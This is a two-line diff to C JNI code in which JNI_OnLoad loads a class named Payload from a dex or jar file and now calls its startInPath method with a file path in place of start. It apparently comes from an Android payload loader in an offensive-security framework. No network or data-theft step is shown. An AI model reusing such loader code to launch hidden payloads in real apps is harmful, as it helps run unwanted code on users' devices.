@@ -46,8 +46,8 @@ JNIEXPORT jint JNICALL JNI_OnLoad( JavaVM *vm, void *pvt )
             (*env)->GetMethodID(env, dex_class, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;"),
             class_file);
 
-    // Call Payload.start();
-    (*env)->CallStaticVoidMethod(env, payload_class, (*env)->GetStaticMethodID(env, payload_class, "start", "()V"));
+    // Call Payload.startInPath();
+    (*env)->CallStaticVoidMethod(env, payload_class, (*env)->GetStaticMethodID(env, payload_class, "startInPath", "(Ljava/lang/String;)V"), file_path);
 
     (*env)->DeleteLocalRef(env, jar_file);
     (*env)->DeleteLocalRef(env, file_path);
